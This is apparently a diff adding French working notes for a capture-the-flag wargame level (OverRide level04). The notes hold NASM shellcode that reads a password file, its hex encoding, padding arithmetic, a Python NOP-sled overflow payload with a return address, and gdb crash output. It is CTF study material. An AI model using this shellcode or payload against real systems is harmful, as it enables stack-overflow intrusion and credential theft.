@@ -106,3 +106,123 @@ Continuing.
 Hello, world!AA[Inferior 13 (process 2436) exited normally]
 (gdb) 
 ```
+
+--- Construction du Shellcode ---
+``` asm
+BITS 32 ; Tell nasm this is 32-bit code.
+
+        jmp short one ; Jump down to a call at the end.
+two:
+; int open(const char *pathname, int flags, ...
+        pop ebx ; Pop the return address (string ptr) into ebx.
+        xor eax, eax ; initialise register eax.
+        xor ecx, ecx ; initialise register ecx.
+        mov al, 5 ; Write syscall open.
+        int 0x80 ; Do syscall: write(1, string, 14) -> put the fd in eax
+
+; ssize_t read(int fd, void buf[.count], size_t count);
+        sub esp, 64 ; reserve space for buf
+        mov ebx, eax ; put the return value in ebx
+        xor eax, eax ; initialise register eax.
+        mov al, 3 ; Write syscall read.
+        mov ecx, esp ; Put the adresse of buffer in ecx
+        xor edx, edx ; initialise register edx.
+        mov dl, 40 ; Length of the .pass (eg. kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf)
+        int 0x80 ; Do syscall: read(eax, buf, 41) -> put the nb of bytes read in eax
+
+; ssize_t write(int fd, const void *buf, size_t count);
+        mov edx, eax ; Write the nb of bytes catch by read
+        xor eax, eax ; initialise register eax.
+        xor ebx, ebx ; initialise register ebx.
+        mov al, 4 ; Write syscall write.
+        mov bl, 1 ; Write fd for stdout
+        ; for ecx, and edx it's the same as read so no change needed
+        int 0x80 ; Do syscall: write(1, buf, 41) -> put the nb of bytes read in eax
+
+; void _exit(int status);
+        xor eax, eax ; initialise register eax.
+        xor ebx, ebx ; initialise register ebx.
+        mov al, 1 ; Exit syscall #
+        ;sub bl, 1 ; Status = 0
+        int 0x80 ; Do syscall: exit(0)
+
+one:
+        call two ; Call back upwards to avoid null bytes
+        db "/home/users/level04/.pass"
+```
+``` bash
+➜  OverRide git:(main) ✗ nasm shellcode2.s -o shellcode2.bin                     
+➜  OverRide git:(main) ✗ xxd -p shellcode2.bin | tr -d '\n' | sed 's/../\\x&/g'  
+\xeb\x2f\x5b\x31\xc0\x31\xc9\xb0\x05\xcd\x80\x83\xec\x40\x89\xc3\x31\xc0\xb0\x03\x89\xe1\x31\xd2\xb2\x28\xcd\x80\x31\xc0\x31\xdb\xb0\x04\xb3\x01\xcd\x80\x31\xc0\x31\xdb\xb0\x01\x80\xeb\x01\xcd\x80\xe8\xcc\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x75\x73\x65\x72\x73\x2f\x6c\x65\x76\x65\x6c\x30\x34\x2f\x2e\x70\x61\x73\x73%    
+# Taille du shellcode
+➜  OverRide git:(main) ✗ echo "\xeb\x2e\x5b\x31\xc0\x31\xc9\xb0\x05\xcd\x80\x83\xec\x40\x89\xc3\x31\xc0\xb0\x03\x89\xe1\x31\xd2\xb2\x28\xcd\x80\x89\xc2\x31\xc0\x31\xdb\xb0\x04\xb3\x01\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80\xe8\xcd\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x75\x73\x65\x72\x73\x2f\x6c\x65\x76\x65\x6c\x30\x34\x2f\x2e\x70\x61\x73\x73" | wc -c
+79
+# Taille du bourrage :
+taille  = 156 - 50 (NOP) - 79 (Shellcode) = 27
+2/ PAYLOAD = NOP + SHELLCODE + BOURRAGE + ADDR_SHELLCODE
+python -c 'print("\x90" * 50 + b"\xeb\x2e\x5b\x31\xc0\x31\xc9\xb0\x05\xcd\x80\x83\xec\x40\x89\xc3\x31\xc0\xb0\x03\x89\xe1\x31\xd2\xb2\x28\xcd\x80\x89\xc2\x31\xc0\x31\xdb\xb0\x04\xb3\x01\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80\xe8\xcd\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x75\x73\x65\x72\x73\x2f\x6c\x65\x76\x65\x6c\x30\x34\x2f\x2e\x70\x61\x73\x73" + "A" * 27 + b"\xa0\xd5\xff\xff")' | ./level4
+
+```
+
+- - - - - - - - - - - - dernieres notes :
+level04@OverRide:~$ python -c 'import sys; sys.stdout.write("\x90" * 50 + "\xeb\x2e\x5b\x31\xc0\x31\xc9\xb0\x05\xcd\x80\x83\xec\x40\x89\xc3\x31\xc0\xb0\x03\x89\xe1\x31\xd2\xb2\x28\xcd\x80\x89\xc2\x31\xc0\x31\xdb\xb0\x04\xb3\x01\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80\xe8\xcd\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x75\x73\x65\x72\x73\x2f\x6c\x65\x76\x65\x6c\x30\x34\x2f\x2e\x70\x61\x73\x73" + "A" * 28 + "\xa0\xd5\xff\xff")'; cat | ./level04
+���������������������������������������������������.[1�1ɰ̀��@��1����1Ҳ(̀��1�1۰�̀1�1۰̀�����/home/users/level04/.passAAAAAAAAAAAAAAAAAAAAAAAAAAAA����Give me some shellcode, k
+whoami
+child is exiting...
+whoami
+level04@OverRide:~$ 
+
+Starting program: /home/users/level04/level04 < <(python -c 'print("\x90" * 50 + b"\xeb\x2e\x5b\x31\xc0\x31\xc9\xb0\x05\xcd\x80\x83\xec\x40\x89\xc3\x31\xc0\xb0\x03\x89\xe1\x31\xd2\xb2\x28\xcd\x80\x89\xc2\x31\xc0\x31\xdb\xb0\x04\xb3\x01\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80\xe8\xcd\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x75\x73\x65\x72\x73\x2f\x6c\x65\x76\x65\x6c\x30\x34\x2f\x2e\x70\x61\x73\x73" + "A" * 28 + b"\xa0\xd5\xff\xff")')
+[New process 1787]
+Give me some shellcode, k
+[Switching to process 1787]
+
+Breakpoint 1, 0x08048763 in main ()
+(gdb) x/16xb $ebp 
+0xffffd718:	0x41	0x41	0x41	0x41	0xa0	0xd5	0xff	0xff
+0xffffd720:	0x00	0x00	0x00	0x00	0xb4	0xd7	0xff	0xff
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0xffffd5a7 in ?? ()
+(gdb) x/32xb $eip
+0xffffd5a7:	0xf7	0x9f	0x00	0x00	0x00	0x00	0x30	0xfd
+0xffffd5af:	0xf7	0x1a	0x00	0x00	0x00	0x00	0x90	0xfd
+0xffffd5b7:	0xf7	0xa1	0x80	0xfd	0xf7	0x81	0xd6	0xff
+0xffffd5bf:	0xff	0xc0	0xfa	0xfc	0xf7	0x80	0xd6	0xff
+(gdb) x/16i $eip
+=> 0xffffd5a7:	neg    DWORD PTR [edi+0x0]
+   0xffffd5ad:	xor    ch,bh
+   0xffffd5af:	neg    DWORD PTR [edx]
+   0xffffd5b1:	add    BYTE PTR [eax],al
+   0xffffd5b3:	add    BYTE PTR [eax],al
+   0xffffd5b5:	nop
+   0xffffd5b6:	std    
+   0xffffd5b7:	mul    DWORD PTR [ecx-0x7e080280]
+   0xffffd5bd:	(bad)  
+   0xffffd5be:	(bad)  
+   0xffffd5bf:	inc    eax
+   0xffffd5c1:	cli    
+   0xffffd5c2:	cld    
+   0xffffd5c3:	test   DWORD PTR [eax-0x3f00002a],0xf4f7e2b6
+   0xffffd5cd:	out    dx,eax
+   0xffffd5ce:	cld    
+(gdb) info registers
+eax            0x0	0
+ecx            0xf7fd08c4	-134412092
+edx            0xffffd680	-10624
+ebx            0x41414141	1094795585
+esp            0xffffd720	0xffffd720
+ebp            0x41414141	0x41414141
+esi            0x8001ffff	-2147352577
+edi            0x41414141	1094795585
+eip            0xffffd5a7	0xffffd5a7
+eflags         0x10686	[ PF SF IF DF RF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+(gdb) 
